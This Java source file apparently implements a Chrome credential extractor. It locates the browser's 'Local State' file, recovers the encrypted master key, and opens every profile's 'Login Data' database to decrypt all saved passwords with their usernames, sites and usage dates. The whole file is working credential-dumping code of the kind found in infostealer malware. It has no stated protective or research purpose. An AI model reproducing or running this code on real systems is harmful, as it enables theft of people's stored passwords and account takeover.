package random.chrome;

import org.json.JSONObject;
import random.db.SqliteService;
import random.util.OperatingSystem;

import java.io.File;
import java.io.IOException;
import java.lang.invoke.MethodHandles;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.Connection;
import java.sql.ResultSet;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.logging.Level;
import java.util.logging.Logger;

import static java.lang.System.getProperty;
import static java.util.stream.Collectors.toMap;
import static random.chrome.ChromeSecurityV2.decryptChromeSecret;
import static random.util.OperatingSystem.getOperatingSystem;

public class ChromeService {
    private static final Logger LOG = Logger.getLogger(MethodHandles.lookup().lookupClass().getName());
    private static final SqliteService sqliteService = new SqliteService();

    public Map<String, List<ChromeAccount>> getProfiles() throws Exception {
        Path chromeInstallPath = getChromeInstallPath();

        File chromeInfo = getLocalStateFile(chromeInstallPath);
        final String infoLines = Files.readAllLines(Paths.get(chromeInfo.toURI())).toArray(new String[]{})[0];

        String jsonProfileString = switch (getOperatingSystem()) {
            case WINDOWS -> infoLines;
            case MAC -> infoLines.split("\\{|\\}")[0];
            default ->
                    throw new Exception("%s is not supported by this application!".formatted(getProperty("os.name")));
        };

        JSONObject rootJson = new JSONObject(jsonProfileString);
        String encryptedMasterKeyWithPrefixB64 = rootJson.getJSONObject("os_crypt").getString("encrypted_key");
        byte[] masterKey = ChromeSecurityV2.getMasterKey(encryptedMasterKeyWithPrefixB64);

        JSONObject infoCache = rootJson.getJSONObject("profile").getJSONObject("info_cache");
        return infoCache.keySet().stream()
                .map(profileName -> {
                    JSONObject userProfile = infoCache.getJSONObject(profileName);
                    String userName = userProfile.getString("user_name");
                    String gaiaName = userProfile.getString("gaia_name");
                    return new ChromeProfile(userName, gaiaName, profileName);
                }).collect(toMap(ChromeProfile::userName, profile -> {
                    File loginDataFile = getLoginDataFile(chromeInstallPath, profile.profileName());
                    return getChromeAccountsFromDatabaseFile(loginDataFile, masterKey);
                }));
    }

    private List<ChromeAccount> getChromeAccountsFromDatabaseFile(File dbFile, byte[] masterKey) {
        try (Connection connection = sqliteService.connectToTempDB(dbFile);
             ResultSet rs = connection.createStatement().executeQuery(ChromeAccount.LOGIN_QUERY)) {
            if (connection.isClosed()) {
                throw new IOException("Connection to database has been terminated! Cannot fetch accounts.");
            }
            List<ChromeAccount> accounts = new ArrayList<>();
            while (rs.next()) {
                accounts.add(new ChromeAccount(
                        rs.getString("username_value"),
                        rs.getString("username_element"),
                        rs.getString("display_name"),
                        decryptChromeSecret(rs.getBytes("password_value"), masterKey),
                        rs.getString("action_url"),
                        rs.getString("origin_url"),
                        rs.getString("date_created"),
                        rs.getString("date_last_used"),
                        rs.getString("date_password_modified"),
                        rs.getInt("times_used")
                ));
            }
            return accounts;
        } catch (Exception e) {
            LOG.log(Level.SEVERE, e.getMessage(), e);
            return Collections.emptyList();
        }
    }

    private Path getChromeInstallPath() throws Exception {
        final OperatingSystem os = getOperatingSystem();
        if (os == OperatingSystem.UNKNOWN) {
            throw new Exception("%s is not supported by this application!".formatted(getProperty("os.name")));
        }
        Path chromeInstall = Paths.get(os.getChromePath());
        if (Files.notExists(chromeInstall)) {
            throw new IOException("Google chrome installation not found.");
        }
        return chromeInstall;
    }

    private File getLoginDataFile(Path chromeInstallPath, String profileName) {
        return new File(chromeInstallPath + File.separator + profileName, "Login Data");
    }

    private File getLocalStateFile(Path chromeInstallPath) {
        return new File(chromeInstallPath.toString(), "Local State");
    }
}
